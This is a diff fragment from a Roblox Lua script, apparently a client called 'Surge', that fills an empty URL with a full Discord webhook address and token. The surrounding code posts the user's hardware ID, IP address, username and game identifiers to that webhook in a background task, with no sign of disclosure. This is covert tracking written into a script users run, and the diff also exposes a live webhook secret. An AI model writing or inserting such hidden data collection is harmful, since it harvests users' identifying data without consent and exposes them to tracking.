@@ -372,7 +372,7 @@ task.spawn(function()
 
     local message = "Device -> "..kaka().."\nUser -> "..game.Players.LocalPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId.."\nkaka ->"..checkcc()
     local options = {
-        Url = "",
+        Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
         Body = HttpService:JSONEncode({
             ['content'] = tostring(message),
             ['username'] = "Surge User "..gethwid().." "..getip()--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
